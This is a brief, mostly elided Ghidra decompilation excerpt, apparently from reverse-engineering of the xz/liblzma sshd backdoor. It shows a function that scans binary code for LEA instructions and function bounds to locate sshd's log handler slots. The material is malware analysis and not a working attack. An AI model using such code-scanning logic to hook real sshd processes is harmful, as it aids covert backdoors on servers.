// /home/kali/xzre-ghidra/xzregh/102B10_sshd_validate_log_handler_slots.c
// Function: sshd_validate_log_handler_slots @ 0x102B10
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_validate_log_handler_slots(void * addr1, void * addr2, void * search_base, u8 * code_end, string_references_t * refs, global_context_t * global)
...
BOOL sshd_validate_log_handler_slots
...

{
  ...
  if ((addr1 != addr2 && addr1 != (void *)0x0) && (addr2 != (void *)0x0)) {
    ...
    if (((slot_distance < 0x10) &&
      ...
      match_success = find_riprel_lea(scan_range_start,(u8 *)scan_range_end,(dasm_ctx_t *)&lea_insn_ptr,handler_struct_addr);
      ...
      if (match_success != FALSE) {
        ...
        if ((match_success != FALSE) && (lea_opcode_signature == 0x168)) {
          ...
          find_function_bounds
                    (scan_range_start,(void **)0x0,&bounded_func_range,(u8 *)search_base,code_end,
                     global->uses_endbr64);
